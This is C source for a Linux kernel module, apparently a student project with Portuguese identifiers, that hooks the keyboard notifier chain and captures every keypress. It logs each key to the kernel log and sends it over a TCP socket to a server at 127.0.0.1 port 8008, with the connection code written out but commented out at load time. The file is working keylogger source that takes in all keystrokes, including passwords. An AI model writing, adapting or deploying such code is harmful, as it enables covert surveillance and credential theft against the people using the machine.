#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include "cliente.h"
#include "keylog.h"
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/net.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/in.h>
#include <asm/uaccess.h>
#include <linux/socket.h>
#include <linux/slab.h>

#define PORTA 8008

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Hugo Nakamura/Isaac Soares");
MODULE_DESCRIPTION("Exemplo de módulo do kernel para ler entradas de teclado");

static struct notifier_block keysniffer_blk = {
    .notifier_call = keyboard_event_handler,
};

struct socket * socket = NULL;

static const char *us_keymap[][2] = {
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
    {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
    {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
    {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
    {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
    {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
    {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
    {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
    {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
    {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
    {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
    {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
    {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
    {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
    {"_PAUSE_", "_PAUSE_"},                                         // 119
};

void keycode_to_string(int keycode, int shift_mask, char *buf, unsigned int buf_size){
    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
    {
        const char *us_key = (shift_mask == 1)
                                ? us_keymap[keycode][1]
                                : us_keymap[keycode][0];
 
        snprintf(buf, buf_size, "%s", us_key);
    }
}

int keyboard_event_handler(struct notifier_block *nblock, unsigned long code, void *_param){
    char keybuf[12] = {0};
    struct keyboard_notifier_param *param = _param;
 
    if (!(param->down)) return NOTIFY_OK;
 
    keycode_to_string(param->value, param->shift, keybuf, 12);
 
    if (strlen(keybuf) < 1) return NOTIFY_OK;
 
    char reply[64];
    memset(&reply, 0, 64);
    strcat(reply, "Keylog: ");
    strcat(reply, keybuf);
    strcat(reply, "\n");
    enviarMensagem(socket, reply, strlen(reply), MSG_DONTWAIT);
    printk(KERN_INFO "Keylog: %s", keybuf);
 
    return NOTIFY_OK;
}

u32 criaEndereco(u8 *ip){
    u32 addr = 0;
    int i;

    for(i = 0; i<4; i++){
        addr += ip[i];
        if(i==3)
            break;
        addr <<= 8;
    }

    return addr;
}

int enviarMensagem(struct socket *localSocket, const char * mensagem, const size_t tam, unsigned long flags){
    struct msghdr msg;
    struct kvec vec;
    int len, written = 0, left = tam;

    //mm_segment_t oldmm;

    msg.msg_name = 0;
    msg.msg_namelen = 0;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = flags;

    //oldmm = get_fs();
    //set_fs(KERNEL_DS);
    
    while(1){
        vec.iov_len = left;
        vec.iov_base = (char *)mensagem + written;
        len = kernel_sendmsg(localSocket, &msg, &vec, left, left);
        if(len == -ERESTARTSYS || !(flags & MSG_DONTWAIT) && len == -EAGAIN)
            continue;
        if(len > 0){
            written += len;
            left -= len;
            if(left)
                continue;

        }
        //set_fs(oldmm);
        break;
    }
    return written ? written:len;
}

int conectarServidor(void){
    struct sockaddr_in endereco;
    unsigned char ip[5] = {127,0,0,1,'\0'};


    int len = 63;
    char reply[64];
    int erro = -1;

    DECLARE_WAIT_QUEUE_HEAD(filaEspera);

    erro = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &socket);
    if(erro < 0){
        printk(KERN_ERR "Erro ao criar o socket.\n");
        return -1;
    }
    memset(&endereco, 0, sizeof(endereco));

    endereco.sin_family = AF_INET;
    endereco.sin_port = htons(PORTA);
    endereco.sin_addr.s_addr = htonl(criaEndereco(ip));

    erro = socket->ops->connect(socket, (struct sockaddr*)&endereco, sizeof(endereco), O_RDWR);
    if(erro && erro != -EINPROGRESS){
        printk(KERN_ERR "Erro ao conectar socket.\n");
        return -1;
    }
    
    printk(KERN_INFO "Conectado ao servidor.\n");

    memset(&reply, 0, len+1);
    strcat(reply, "HOLA\n");
    enviarMensagem(socket, reply, strlen(reply), MSG_DONTWAIT);

    return 0;
}

static int __init iniciaModulo(void)
{
    printk(KERN_INFO "Iniciando modulo.\n");
    //conectarServidor();
    register_keyboard_notifier(&keysniffer_blk);
    return 0;
}

static void __exit fechaModulo(void)
{
    printk(KERN_INFO "Fechando modulo.\n");
    unregister_keyboard_notifier(&keysniffer_blk);
}

module_init(iniciaModulo);
module_exit(fechaModulo);